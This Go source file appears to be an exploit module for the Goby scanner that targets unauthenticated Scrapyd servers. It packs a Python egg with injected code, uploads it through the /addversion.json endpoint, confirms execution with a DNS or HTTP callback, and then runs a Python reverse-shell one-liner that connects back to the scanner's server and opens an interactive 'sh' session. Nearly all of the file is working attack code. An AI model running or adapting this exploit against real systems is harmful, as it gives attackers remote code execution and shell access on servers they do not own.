package exploits

import (
	"archive/zip"
	"bytes"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Scrapyd Unauthorized Access RCE",
    "Description": "Scrapyd is a cloud service provided by the crawler framework scrapy. Users can deploy their own scrapy package to the cloud service, which is listening on port 6800 by default. If an attacker can access this port, he will be able to deploy malicious code to the server and gain server permissions.",
    "Product": "Scrapyd",
    "Homepage": "https://github.com/scrapy/scrapyd",
    "DisclosureDate": "2019-09-18",
    "Author": "ovi3",
    "GobyQuery": "title=\"Scrapyd\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "https://github.com/vulhub/vulhub/blob/master/scrapy/scrapyd-unacc/README.zh-cn.md",
        "https://www.leavesongs.com/PENETRATION/attack-scrapy.html"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "goby_shell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "unauthorized",
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "Scrapyd"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "PocId": "10212"
}`

	buildEgg := func(pyCode string) (string, error) {
		buf := new(bytes.Buffer)
		w := zip.NewWriter(buf)

		var files = []struct {
			Name, Body string
		}{
			{"EGG-INFO/dependency_links.txt", "\n"},
			{"EGG-INFO/entry_points.txt", "[scrapy]\nsettings = spiderman.settings"},
			{"EGG-INFO/PKG-INFO", "Metadata-Version: 1.0\nName: project\nVersion: 1.0\nSummary: UNKNOWN\nHome-page: UNKNOWN\nAuthor: UNKNOWN\nAuthor-email: UNKNOWN\nLicense: UNKNOWN\nDescription: UNKNOWN\nPlatform: UNKNOWN"},
			{"EGG-INFO/SOURCES.txt", "setup.py\nproject.egg-info/PKG-INFO\nproject.egg-info/SOURCES.txt\nproject.egg-info/dependency_links.txt\nproject.egg-info/entry_points.txt\nproject.egg-info/top_level.txt\nspiderman/__init__.py\nspiderman/items.py\nspiderman/middlewares.py\nspiderman/pipelines.py\nspiderman/settings.py\nspiderman/spiders/__init__.py"},
			{"EGG-INFO/top_level.txt", "spiderman"},

			{"spiderman/__init__.py", pyCode},
			{"spiderman/items.py", "import scrapy\nclass SpidermanItem(scrapy.Item):\n    pass\n"},
			{"spiderman/middlewares.py", "from scrapy import signals\nfrom itemadapter import is_item, ItemAdapter\n\n\nclass SpidermanSpiderMiddleware:\n    @classmethod\n    def from_crawler(cls, crawler):\n        s = cls()\n        crawler.signals.connect(s.spider_opened, signal=signals.spider_opened)\n        return s\n\n    def process_spider_input(self, response, spider):\n        return None\n\n    def process_spider_output(self, response, result, spider):\n        for i in result:\n            yield i\n\n    def process_spider_exception(self, response, exception, spider):\n        pass\n\n    def process_start_requests(self, start_requests, spider):\n        for r in start_requests:\n            yield r\n\n    def spider_opened(self, spider):\n        spider.logger.info('Spider opened: %s' % spider.name)\n\n\nclass SpidermanDownloaderMiddleware:\n    @classmethod\n    def from_crawler(cls, crawler):\n        s = cls()\n        crawler.signals.connect(s.spider_opened, signal=signals.spider_opened)\n        return s\n\n    def process_request(self, request, spider):\n        return None\n\n    def process_response(self, request, response, spider):\n        return response\n\n    def process_exception(self, request, exception, spider):\n        pass\n\n    def spider_opened(self, spider):\n        spider.logger.info('Spider opened: %s' % spider.name)\n"},
			{"spiderman/pipelines.py", "from itemadapter import ItemAdapter\n\n\nclass SpidermanPipeline:\n    def process_item(self, item, spider):\n        return item"},
			{"spiderman/settings.py", "BOT_NAME = 'spiderman'\nSPIDER_MODULES = ['spiderman.spiders']\nNEWSPIDER_MODULE = 'spiderman.spiders'\nROBOTSTXT_OBEY = True"},
			{"spiderman/spiders/__init__.py", ""},
		}
		for _, file := range files {
			f, err := w.Create(file.Name)
			if err != nil {
				return "", err
			}
			_, err = f.Write([]byte(file.Body))
			if err != nil {
				return "", err
			}
		}

		err := w.Close()
		if err != nil {
			return "", err
		}

		return buf.String(), nil

	}

	execPyCode := func(u *httpclient.FixUrl, pyCode string) bool {
		// eggBase64Data := "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"
		eggData, err := buildEgg(pyCode)
		if err != nil {
			fmt.Println(err)
			return false
		}

		uri := "/addversion.json"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		boundary := goutils.RandomHexString(16)
		cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----"+boundary)
		cfg.Data = "------" + boundary + "\r\nContent-Disposition: form-data; name=\"project\"\r\n\r\nspiderman\r\n" +
			"------" + boundary + "\r\nContent-Disposition: form-data; name=\"version\"\r\n\r\nr01\r\n" +
			"------" + boundary + "\r\nContent-Disposition: form-data; name=\"egg\"; filename=\"spiderman.egg\"\r\nContent-Type: application/octet-stream\r\n\r\n" + eggData + "\r\n------" + boundary + "--"
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return strings.Contains(resp.RawBody, `"status": "ok"`)
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomHex := goutils.RandomHexString(4)
			checkUrl, isDomain := godclient.GetGodCheckURL(randomHex)

			if isDomain {
				execPyCode(u, fmt.Sprintf("import socket\nsocket.gethostbyname('%s')", checkUrl))
			} else {
				execPyCode(u, fmt.Sprintf("try:\n    import urllib2\n    urllib2.urlopen(\"%s\", timeout=6).read()\nexcept ModuleNotFoundError:\n    import urllib.request\n    urllib.request.urlopen(\"%s\", timeout=6).read()", checkUrl, checkUrl))
			}

			return godclient.PullExists(randomHex, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			waitSessionCh := make(chan string)
			if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
				log.Println("[WARNING] godclient bind failed", err)
			} else {
				execPyCode(expResult.HostInfo, fmt.Sprintf(`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")`, godclient.GetGodServerHost(), rp))

				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						fmt.Println(webConsleID)
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 15):
				}
			}
			return expResult
		},
	))
}
